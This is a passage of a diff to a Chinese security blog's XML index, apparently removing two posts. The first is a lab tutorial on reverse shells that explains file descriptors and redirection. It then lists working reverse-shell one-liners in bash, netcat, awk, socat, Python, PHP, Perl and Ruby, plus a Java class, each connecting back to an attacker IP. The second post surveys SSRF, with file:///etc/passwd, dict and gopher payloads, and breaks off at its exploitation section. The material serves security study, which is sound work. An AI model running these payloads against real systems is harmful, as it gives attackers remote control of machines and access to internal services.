-<p>解释: 解析器解析到 <code>&lt;</code> 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。</p>
-<h4 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h4><p>格式：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&gt;word	</span><br></pre></td></tr></table></figure>
-<p>说明： 将文件描述符 n 重定向到 word 指代的文件（以写的方式打开），如果 n 省略则默认就是 1（标准输出）</p>
-<p>example：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># echo hello&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">hello</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># &gt;file echo world</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">world</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="标准输出与标准错误输出重定向"><a href="#标准输出与标准错误输出重定向" class="headerlink" title="标准输出与标准错误输出重定向"></a>标准输出与标准错误输出重定向</h4><p>格式：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;&gt; word </span><br><span class="line">&gt;&amp; word</span><br></pre></td></tr></table></figure>
-<p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 <code>&gt; word 2&gt;&amp;1</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># mkdir &amp;&gt; file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">mkdir: missing operand</span><br><span class="line">Try <span class="string">&#x27;mkdir --help&#x27;</span> <span class="keyword">for</span> more information.</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># ls &amp;&gt; file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="文件描述符的复制"><a href="#文件描述符的复制" class="headerlink" title="文件描述符的复制"></a>文件描述符的复制</h4><p>格式：**(这里所有字符之间不要有空格)**</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&lt;&amp;[m] </span><br><span class="line">[n]&gt;&amp;[m] </span><br></pre></td></tr></table></figure>
-<p>说明：</p>
-<ol>
-<li><p>这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开，<strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p>
-</li>
-<li><p>这里的 &amp; 目的是为了区分数字名字的文件和文件描述符，如果没有 &amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符。</p>
-</li>
-</ol>
-<p><strong>重点：</strong></p>
-<p>之前我们说过，重定向符号的顺序不能随便换，因为系统是从左到右执行的，我们下面就举一个例子</p>
-<ul>
-<li>cmd &gt; file 2&gt;&amp;1</li>
-</ul>
-<p>这个是先把标准输出<code>stdout1</code>重定向到file文件中，然后把标准错误<code>stderr2</code>重定向到标准输出所指向的文件中，也就是file。</p>
-<ul>
-<li>cmd 2&gt;&amp;1 &gt;file</li>
-</ul>
-<p>这一个是先把标准错误<code>stderr2</code>重定向到标准输出<code>stdout1</code>所指向的文件，这里默认是屏幕，然后再把标准输出<code>stdout1</code>重定向到file文件中。</p>
-<h4 id="exec-绑定重定向"><a href="#exec-绑定重定向" class="headerlink" title="exec 绑定重定向"></a>exec 绑定重定向</h4><p>格式：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> [n] &lt;/&gt; file/[n]</span><br></pre></td></tr></table></figure>
-<p>上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p>
-<p><strong>重点：</strong></p>
-<p>格式： </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&lt;&gt;word</span><br></pre></td></tr></table></figure>
-<p>说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</p>
-<p>example：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># exec 3&lt;&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># ls &gt;&amp;3</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># exec 3&lt;&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat &lt;&amp;3</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>学完了前置知识，接下来就看看反弹shell的原理部分。</p>
-<p>实验环境：</p>
-<ul>
-<li><p>靶机（Ubuntu）IP：192.168.91.144</p>
-</li>
-<li><p>攻击机（Kali）IP：192.168.91.128</p>
-</li>
-</ul>
-<p>首先在攻击机上开启监听端口：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>
-<p>然后再靶机上执行：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p>然后就可以看到攻击机控制了靶机的shell</p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325215552795.png" alt="image-20210325215552795"></p>
-<p>命令解释：</p>
-<ul>
-<li><p><strong>bash -i</strong></p>
-<ol>
-<li><p>bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p>
-</li>
-<li><p>-i 这个参数表示的是产生交互式的shell</p>
-</li>
-</ol>
-</li>
-<li><p><strong>/dev/tcp/ip/port</strong></p>
-</li>
-</ul>
-<p>/dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的。但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信。</p>
-<p>example：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#靶机输入</span></span><br><span class="line">root@ubuntu18:~<span class="comment"># echo hello world &gt; /dev/tcp/192.168.91.128/2333</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#攻击机接收</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvp 2333</span></span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">192.168.91.144: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.91.128] from (UNKNOWN) [192.168.91.144] 32960</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
-<p>example：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#攻击机输入</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvp 2333</span></span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">hello world</span><br><span class="line">192.168.91.144: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.91.128] from (UNKNOWN) [192.168.91.144] 32964</span><br><span class="line">I am a good boy</span><br><span class="line"></span><br><span class="line"><span class="comment">#靶机接收</span></span><br><span class="line">root@ubuntu18:~<span class="comment"># cat &lt; /dev/tcp/192.168.91.128/2333</span></span><br><span class="line">hello world</span><br><span class="line">I am a good boy</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong>交互重定向</strong></li>
-</ul>
-<p>把上述的两个命令组合起来并使用重定向：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333</span><br></pre></td></tr></table></figure>
-<p>这样就把靶机的shell的标准输出和标准错误给重定向到了攻击机上，这时候我们靶机上已经无法显示东西，但是仍然能够输入命令（只是在靶机上看不见），而命令输出的结果在攻击机上显示。</p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325221535454.png" alt="image-20210325221535454"></p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325221526338.png" alt="image-20210325221526338"></p>
-<p>这样还不够，攻击机还需要获得靶机的输入控制权，于是可以在命令的末尾加上把标准输入<code>stdin0</code>重定向到标准输出或者标准错误输出所指向的文件即可：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="常见利用语句"><a href="#常见利用语句" class="headerlink" title="常见利用语句"></a>常见利用语句</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&lt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 &lt;&amp;2</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&lt;&amp;2</span><br></pre></td></tr></table></figure>
-<p>文件的读/写打开方式对于文件描述符来讲并没有什么区别</p>
-<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.91.128/2333;cat &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-<p>解释：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.91.128/2333;</span><br></pre></td></tr></table></figure>
-<p>这一句将文件描述符5重定向到了 <code>/dev/tcp/192.168.91.128/2333</code> 并且方式是<strong>读写方式</strong>，于是我们就能通过文件描述符对这个socket连接进行操作了。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-<p>首先从文件描述符5中读取传过来的命令，通过管道符传到后面的命令，从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。并将操作结果的标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。</p>
-<p>example:</p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325223538469.png" alt="image-20210325223538469"></p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325223556753.png" alt="image-20210325223556753"></p>
-<h4 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h4><p>nc如果版本是有 -e 选项的话就能够直接反弹shell，出于安全原因，Ubuntu自带的nc是不带这个选项的。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.91.128 2333</span><br></pre></td></tr></table></figure>
-<p>如果没有 -e 选项的话还可以使用：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.91.128 2333 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
-<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
-<p>example:</p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326115210794.png" alt="image-20210326115210794"></p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326115224913.png" alt="image-20210326115224913"></p>
-<h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><p>攻击机上打开两个终端分别执行监听：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br><span class="line">nc -lvp 5555</span><br></pre></td></tr></table></figure>
-<p>靶机中执行：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 192.168.91.128 4444 | /bin/bash | telnet 192.168.91.128 5555</span><br></pre></td></tr></table></figure>
-<p>从4444端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。</p>
-<p>example：</p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326121226183.png" alt="image-20210326121226183"></p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326121243836.png" alt="image-20210326121243836"></p>
-<h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.91.128/2333&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-<h4 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.91.128:2333</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.91.128&#x27;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.91.128&quot;,5555);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.99.242&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;192.168.91.128&quot;,2333).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> Exception </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>当我们使用Ubuntu作为服务器，是无法直接通过使用命令执行的函数如<code>system()</code>等去执行<code>bash</code>命令，会显示<code>sh: 1: Syntax error: Bad fd number</code>，这个错误在centos中是不会出现的，这是因为ubuntu从6.10开始，默认使用dash（登录还是用bash），因为dash更快更高效。只要把bash链接到sh即可。</p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20190115161623.png" alt="img"></p>
-<h3 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h3><p>由于把Window作为服务器比较少见，在加上里面很多东西我也没见过，这里贴个链接，以备不时之需。</p>
-<p><a class="link"   href="https://lipeilipei.top/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" >Windows 反弹 shell<i class="fas fa-external-link-alt"></i></a></p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://xz.aliyun.com/t/2548" >Linux反弹shell（一）文件描述符与重定向<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://xz.aliyun.com/t/2549#toc-10" >Linux 反弹shell（二）反弹shell的本质<i class="fas fa-external-link-alt"></i></a></p>
-]]></content>
-      <categories>
-        <category>安全</category>
-      </categories>
-      <tags>
-        <tag>反弹shell</tag>
       </tags>
   </entry>
   <entry>
@@ -9733,140 +9867,6 @@
       </categories>
       <tags>
         <tag>DVWA</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SSRF总结</title>
-    <url>/2021/03/31/SSRF%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h1 id="SSRF总结"><a href="#SSRF总结" class="headerlink" title="SSRF总结"></a>SSRF总结</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以<strong>服务器的身份</strong>发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的<strong>内部系统</strong>。SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>SSRF漏洞形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如,黑客操作服务端从指定URL地址获取网页文本内容,加载指定地址的图片等,利用的是服务端的请求伪造,SSRF利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。</p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20.png" alt="img"></p>
-<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul>
-<li>对目标服务器所在内网进行IP存活性扫描和端口扫描</li>
-<li>利用扫描的自问信息判断开放的服务，从而对内网的主机进行攻击</li>
-<li>识别内网web应用指纹，判断应用类型进行攻击</li>
-<li>使用特定协议攻击应用（gopher、dict、file、FTP/SFTP等）</li>
-</ul>
-<h2 id="容易出现漏洞的地方"><a href="#容易出现漏洞的地方" class="headerlink" title="容易出现漏洞的地方"></a>容易出现漏洞的地方</h2><h3 id="分享"><a href="#分享" class="headerlink" title="分享"></a>分享</h3><p>通过url 地址分享文章，例如如下地址：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;share.xxx.com&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure>
-<p>通过url参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</p>
-<h3 id="图片加载与下载"><a href="#图片加载与下载" class="headerlink" title="图片加载与下载"></a>图片加载与下载</h3><p>通过URL地址加载或下载图片</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;image.xxx.com&#x2F;image.php?image&#x3D;http:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure>
-<p>图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载远程图片到服务器内。还有一些采用了加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF。</p>
-<h3 id="图片、文章收藏功能"><a href="#图片、文章收藏功能" class="headerlink" title="图片、文章收藏功能"></a>图片、文章收藏功能</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;title.xxx.com&#x2F;title?title&#x3D;http:&#x2F;&#x2F;title.xxx.com&#x2F;as52ps63de</span><br></pre></td></tr></table></figure>
-<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p>
-<h3 id="利用参数中的关键字来查找"><a href="#利用参数中的关键字来查找" class="headerlink" title="利用参数中的关键字来查找"></a>利用参数中的关键字来查找</h3><ul>
-<li><p>share</p>
-</li>
-<li><p>wap</p>
-</li>
-<li><p>url</p>
-</li>
-<li><p>link</p>
-</li>
-<li><p>src</p>
-</li>
-<li><p>source</p>
-</li>
-<li><p>target</p>
-</li>
-<li><p>u</p>
-</li>
-<li><p>3g</p>
-</li>
-<li><p>display</p>
-</li>
-<li><p>sourceURl</p>
-</li>
-<li><p>imageURL</p>
-</li>
-<li><p>domain</p>
-</li>
-</ul>
-<h2 id="产生漏洞的函数"><a href="#产生漏洞的函数" class="headerlink" title="产生漏洞的函数"></a>产生漏洞的函数</h2><p>下面是几个可能会存在SSRF的服务器使用的函数：</p>
-<h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p>这个函数的作用是将整个文件读入一个字符串。</p>
-<p>example:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$homepage</span> = file_get_contents(<span class="string">&#x27;./people.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$homepage</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>获取<code>./people.txt</code>文件的内容，并以字符串的形式显示出来。</p>
-<h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h3><p>这个函数的作用是打开一个网络连接或者一个Unix套接字连接。</p>
-<p>example：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="string">&quot;www.example.com&quot;</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: www.example.com\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h3><p>这个函数的作用是执行给定的 cURL 会话。</p>
-<p>example:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line"><span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&quot;http://www.example.com/&quot;</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">curl_exec(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="常用协议介绍"><a href="#常用协议介绍" class="headerlink" title="常用协议介绍"></a>常用协议介绍</h2><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>file协议主要用于访问本地计算机的文件，就如同windows资源管理器中打开文件一样，可以用于读取文件进行查看。</p>
-<p>example:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
-<h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>词典网络协议可以用于探测或扫描内网端口在SSRF中发挥重要作用。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dict:&#x2F;&#x2F;127.0.0.1:8080</span><br></pre></td></tr></table></figure>
-<h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><p>gopher是internet上一个非常有名的信息查找系统，你可以这么理解成可以和TCP进行一个发送数据包，因为我们SSRF漏洞语出web页面，所以我们可以有效地利用gopher协议进行加以利用其它程序漏洞来进行进一步的提权。</p>
-<p>gopher协议的转换规则如下：</p>
-<ul>
-<li>如果第一个字符是<code>&gt;</code>或者<code>&lt; </code>那么丢弃该行字符串，表示请求和返回的时间。</li>
-<li>如果前3个字符是<code>+OK</code> 那么丢弃该行字符串，表示返回的字符串。</li>
-<li>将<code>\r</code>字符串替换成<code>%0d%0a</code></li>
-<li>空白行替换为<code>%0a</code></li>
-</ul>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的绕过方式。</p>
